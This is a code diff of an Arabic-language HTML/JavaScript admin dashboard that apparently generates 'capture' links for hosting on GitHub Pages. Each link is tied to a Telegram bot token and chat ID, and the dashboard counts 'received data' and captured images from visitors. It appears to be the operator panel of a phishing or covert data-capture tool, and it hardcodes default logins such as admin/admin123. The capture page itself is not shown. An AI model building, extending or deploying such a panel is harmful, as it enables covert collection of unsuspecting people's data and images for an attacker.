@@ -114,21 +114,6 @@
             font-size: 1em;
         }
 
-        .file-input {
-            width: 100%;
-            padding: 20px;
-            border: 2px dashed #666;
-            border-radius: 8px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            background: rgba(50, 50, 50, 0.5);
-        }
-
-        .file-input:hover {
-            border-color: #ff6b6b;
-        }
-
         .result {
             background: rgba(255, 0, 0, 0.1);
             border: 1px solid #ff6b6b;
@@ -489,7 +474,6 @@
                     <div class="tab" data-tab="data">البيانات المستلمة</div>
                     <div class="tab" data-tab="settings">الإعدادات</div>
                     <div class="tab admin-only" data-tab="users" id="usersTab">إدارة المستخدمين</div>
-                    <div class="tab" data-tab="backup">النسخ الاحتياطي</div>
                 </div>
 
                 <!-- قسم إنشاء الروابط -->
@@ -675,38 +659,6 @@
                         </div>
                     </div>
                 </div>
-
-                <!-- قسم النسخ الاحتياطي -->
-                <div class="tab-content" id="backup-tab">
-                    <div class="card">
-                        <div class="card-title">
-                            <span>💾</span>
-                            النسخ الاحتياطي والاستعادة
-                        </div>
-
-                        <div class="export-import">
-                            <div class="input-group">
-                                <label class="input-label">تصدير البيانات</label>
-                                <p style="color: #b0b0b0; margin-bottom: 15px;">حفظ نسخة احتياطية من جميع بيانات النظام</p>
-                                <button class="btn btn-success" id="exportDataBtn">📥 تصدير البيانات</button>
-                            </div>
-
-                            <div class="input-group">
-                                <label class="input-label">استيراد البيانات</label>
-                                <p style="color: #b0b0b0; margin-bottom: 15px;">استعادة البيانات من نسخة احتياطية</p>
-                                <input type="file" id="importFile" accept=".json" style="display: none;">
-                                <button class="btn" onclick="document.getElementById('importFile').click()">📤 استيراد البيانات</button>
-                                <small style="color: #ff6b6b; display: block; margin-top: 10px;">⚠️ سيتم استبدال جميع البيانات الحالية</small>
-                            </div>
-
-                            <div class="input-group">
-                                <label class="input-label">مسح جميع البيانات</label>
-                                <p style="color: #b0b0b0; margin-bottom: 15px;">حذف جميع البيانات وإعادة الضبط</p>
-                                <button class="btn" style="background: #ff3d3d;" id="resetDataBtn">🗑️ مسح جميع البيانات</button>
-                            </div>
-                        </div>
-                    </div>
-                </div>
             </div>
 
             <div class="message success" id="successMessage"></div>
@@ -732,7 +684,7 @@
                     return JSON.parse(data);
                 } else {
                     // بيانات افتراضية
-                    return {
+                    const defaultData = {
                         users: [
                             { username: 'admin', password: 'admin123', role: 'admin', createdAt: new Date().toISOString() },
                             { username: 'user', password: 'user123', role: 'user', createdAt: new Date().toISOString() }
@@ -746,6 +698,8 @@
                         },
                         activityLog: []
                     };
+                    await this.saveSystemData(defaultData);
+                    return defaultData;
                 }
             }
 
@@ -837,10 +791,7 @@
             newPassword: document.getElementById('newPassword'),
             newUserRole: document.getElementById('newUserRole'),
             addUserBtn: document.getElementById('addUserBtn'),
-            usersList: document.getElementById('usersList'),
-            exportDataBtn: document.getElementById('exportDataBtn'),
-            importFile: document.getElementById('importFile'),
-            resetDataBtn: document.getElementById('resetDataBtn')
+            usersList: document.getElementById('usersList')
         };
 
         // التحقق من حالة تسجيل الدخول
@@ -876,9 +827,11 @@
         async function saveSystemData() {
             try {
                 await DataManager.saveSystemData(systemData);
+                return true;
             } catch (error) {
                 console.error('فشل في حفظ بيانات النظام:', error);
                 showMessage('error', '❌ فشل في حفظ البيانات');
+                return false;
             }
         }
 
@@ -894,19 +847,25 @@
             elements.dashboardPage.style.display = 'block';
             elements.currentUser.textContent = currentUser.username;
             
+            // إظهار/إخفاء أقسام المسؤول
             if (currentUser.role === 'admin') {
                 document.querySelectorAll('.admin-only').forEach(el => {
                     el.style.display = 'block';
                 });
             }
             
+            // تحميل البيانات
             await loadSystemData();
             updateStats();
             updateLinksList();
             updateDataList();
             updateUsersList();
             
+            // تسجيل نشاط الدخول
             await DataManager.logActivity(currentUser.username, 'تسجيل الدخول', 'دخول إلى لوحة التحكم');
+            
+            addTerminalLog('🚀 تم تحميل لوحة التحكم بنجاح');
+            addTerminalLog(`👤 المستخدم: ${currentUser.username}`);
         }
 
         // تسجيل الدخول
@@ -924,6 +883,7 @@
                 if (user) {
                     currentUser = user;
                     
+                    // حفظ حالة تسجيل الدخول إذا طلب المستخدم ذلك
                     if (rememberMe) {
                         localStorage.setItem('currentUser', JSON.stringify(currentUser));
                         localStorage.setItem('rememberMe', 'true');
@@ -954,13 +914,17 @@
         const tabs = document.querySelectorAll('.tab');
         tabs.forEach(tab => {
             tab.addEventListener('click', () => {
+                // إزالة النشاط من جميع التبويبات
                 tabs.forEach(t => t.classList.remove('active'));
+                // إضافة النشاط للتبويب المحدد
                 tab.classList.add('active');
                 
+                // إخفاء جميع محتويات التبويبات
                 document.querySelectorAll('.tab-content').forEach(content => {
                     content.classList.remove('active');
                 });
                 
+                // إظهار محتوى التبويب المحدد
                 const tabId = tab.getAttribute('data-tab');
                 document.getElementById(`${tabId}-tab`).classList.add('active');
             });
@@ -983,6 +947,7 @@
             elements.dataReceived.textContent = systemData.receivedData.length;
             elements.imagesReceived.textContent = systemData.receivedData.filter(data => data.images && data.images.length > 0).length;
             
+            // إحصائيات النظام
             elements.totalVisits.textContent = systemData.receivedData.length;
             elements.successRate.textContent = systemData.receivedData.length > 0 ? 
                 `${Math.round((systemData.receivedData.filter(data => data.success).length / systemData.receivedData.length) * 100)}%` : '0%';
@@ -996,6 +961,11 @@
             const linkDescription = document.getElementById('linkDescription').value || 'لا يوجد وصف';
             const botToken = document.getElementById('botToken').value || systemData.settings.defaultBotToken;
             const chatId = document.getElementById('chatId').value || systemData.settings.defaultChatId;
+            
+            if (!linkName.trim()) {
+                showMessage('error', '❌ يرجى إدخال اسم للرابط');
+                return;
+            }
             
             elements.progress.style.display = 'block';
             let progress = 0;
@@ -1015,12 +985,14 @@
         async function completeLinkGeneration(name, description, botToken, chatId) {
             elements.progress.style.display = 'none';
             
+            // إنشاء رابط حقيقي
             const linkId = generateLinkId();
-            const linkUrl = `${window.location.origin}/capture/${linkId}`;
+            // استخدام رابط حقيقي يعمل مع GitHub Pages
+            const linkUrl = `${window.location.origin}/${window.location.pathname.split('/')[1] || ''}capture.html?link=${linkId}`;
             
             elements.generatedLink.innerHTML = `
                 <strong>الرابط:</strong><br>
-                <a href="${linkUrl}" style="color: #ff6b6b;">${linkUrl}</a><br><br>
+                <a href="${linkUrl}" target="_blank" style="color: #ff6b6b;">${linkUrl}</a><br><br>
                 <strong>الاسم:</strong> ${name}<br>
                 <strong>الوصف:</strong> ${description}<br>
                 <strong>البوت:</strong> ${botToken.substring(0, 10)}...<br>
@@ -1030,6 +1002,7 @@
             elements.linkResult.style.display = 'block';
             showMessage('success', '✅ تم إنشاء الرابط بنجاح');
             
+            // حفظ الرابط في النظام
             const newLink = {
                 id: linkId,
                 name: name,
@@ -1051,7 +1024,9 @@
                 
                 updateStats();
                 updateLinksList();
+                
                 addTerminalLog(`🔗 تم إنشاء رابط جديد: ${name}`);
+                addTerminalLog(`🌐 الرابط: ${linkUrl}`);
             } catch (error) {
                 showMessage('error', '❌ فشل في حفظ الرابط');
             }
@@ -1060,6 +1035,11 @@
         // تحديث قائمة الروابط
         function updateLinksList() {
             elements.linksList.innerHTML = '';
+            
+            if (systemData.links.length === 0) {
+                elements.linksList.innerHTML = '<div class="device-item" style="text-align: center; color: #b0b0b0;">لا توجد روابط بعد</div>';
+                return;
+            }
             
             systemData.links.forEach(link => {
                 const linkElement = document.createElement('div');
@@ -1287,7 +1267,7 @@
                 }
             }
         }
-
+        
         // إضافة مستخدم جديد
         elements.addUserBtn.addEventListener('click', async () => {
             if (currentUser.role !== 'admin') {
@@ -1346,69 +1326,6 @@
             }
         });
 
-        // تصدير البيانات
-        elements.exportDataBtn.addEventListener('click', () => {
-            const dataStr = JSON.stringify(systemData, null, 2);
-            const dataBlob = new Blob([dataStr], { type: 'application/json' });
-            const url = URL.createObjectURL(dataBlob);
-            const link = document.createElement('a');
-            link.href = url;
-            link.download = `backup-${new Date().toISOString().split('T')[0]}.json`;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            URL.revokeObjectURL(url);
-            showMessage('success', '✅ تم تصدير البيانات بنجاح');
-            DataManager.logActivity(currentUser.username, 'تصدير بيانات', 'تم تصدير نسخة احتياطية');
-        });
-
-        // استيراد البيانات
-        elements.importFile.addEventListener('change', async (event) => {
-            const file = event.target.files[0];
-            if (!file) return;
-
-            if (!confirm('⚠️ سيتم استبدال جميع البيانات الحالية. هل تريد المتابعة؟')) {
-                return;
-            }
-
-            const reader = new FileReader();
-            reader.onload = async (e) => {
-                try {
-                    const importedData = JSON.parse(e.target.result);
-                    systemData = importedData;
-                    await saveSystemData();
-                    showMessage('success', '✅ تم استيراد البيانات بنجاح');
-                    location.reload();
-                    await DataManager.logActivity(currentUser.username, 'استيراد بيانات', 'تم استيراد نسخة احتياطية');
-                } catch (error) {
-                    showMessage('error', '❌ ملف غير صالح أو تالف');
-                }
-            };
-            reader.readAsText(file);
-        });
-
-        // مسح جميع البيانات
-        elements.resetDataBtn.addEventListener('click', async () => {
-            if (!confirm('⚠️ سيتم حذف جميع البيانات ولا يمكن التراجع عن هذا الإجراء. هل أنت متأكد؟')) {
-                return;
-            }
-
-            if (!confirm('❌ تأكيد نهائي: جميع البيانات سيتم حذفها بشكل دائم!')) {
-                return;
-            }
-
-            try {
-                localStorage.removeItem('adminSystemData');
-                showMessage('success', '✅ تم مسح جميع البيانات بنجاح');
-                setTimeout(() => {
-                    location.reload();
-                }, 2000);
-                await DataManager.logActivity(currentUser.username, 'مسح البيانات', 'تم حذف جميع البيانات');
-            } catch (error) {
-                showMessage('error', '❌ فشل في مسح البيانات');
-            }
-        });
-
         // محاكاة استقبال بيانات (للتجربة)
         async function simulateDataReceipt() {
             const links = systemData.links.filter(link => link.active);
@@ -1443,6 +1360,7 @@
                 
                 addTerminalLog(`📨 تم استقبال بيانات جديدة من: ${randomLink.name}`);
                 
+                // تحديث علامة التبويب إذا كانت نشطة
                 if (document.getElementById('data-tab').classList.contains('active')) {
                     updateDataList();
                 }
@@ -1481,6 +1399,13 @@
             setTimeout(() => {
                 simulateDataReceipt();
             }, 2000);
+        });
+
+        // تحميل الإعدادات عند فتح صفحة الإعدادات
+        document.getElementById('settings-tab').addEventListener('click', () => {
+            elements.defaultBotToken.value = systemData.settings.defaultBotToken;
+            elements.defaultChatId.value = systemData.settings.defaultChatId;
+            elements.storageType.value = systemData.settings.storageType;
         });
     </script>
 </body>
